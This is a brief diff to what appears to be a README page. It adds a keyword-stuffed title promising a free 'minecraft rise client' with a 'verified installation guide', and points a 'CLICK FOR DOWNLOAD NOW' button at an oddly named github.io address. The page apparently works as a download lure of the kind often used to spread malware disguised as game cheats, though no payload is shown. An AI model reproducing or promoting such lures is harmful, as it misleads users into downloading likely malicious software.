@@ -1,10 +1,10 @@
-
+# download free minecraft rise client for Windows | verified installation guide minecraft rise client. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( https://liquidbounce-javascrip-uc19.github.io/.github/) |
  |---------------------|----------------------:|
 
 
